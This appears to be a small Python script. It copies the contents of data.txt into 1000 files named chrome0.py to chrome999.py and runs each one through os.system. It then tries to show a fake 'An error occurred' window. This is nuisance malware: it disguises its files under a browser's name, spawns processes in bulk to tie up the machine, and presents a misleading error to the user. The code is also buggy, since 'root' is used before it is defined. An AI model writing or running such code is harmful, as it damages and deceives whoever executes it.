import math
from os import system
import tkinter as tk

code = "";

with open("data.txt","r") as e:
  global code
  code = e.read()

for x in range(1000):
  with open(f"chrome{x}.py","w") as f:
    f.write(code)
    system(f"python chrome{x}.py")


root.Tk()
root.title('An error occurred')
root.geometry('100x50')

mylabel = tk.Label(root, text='Error', font=('Arial', 18))
mylabel.pack()


root.mainloop()
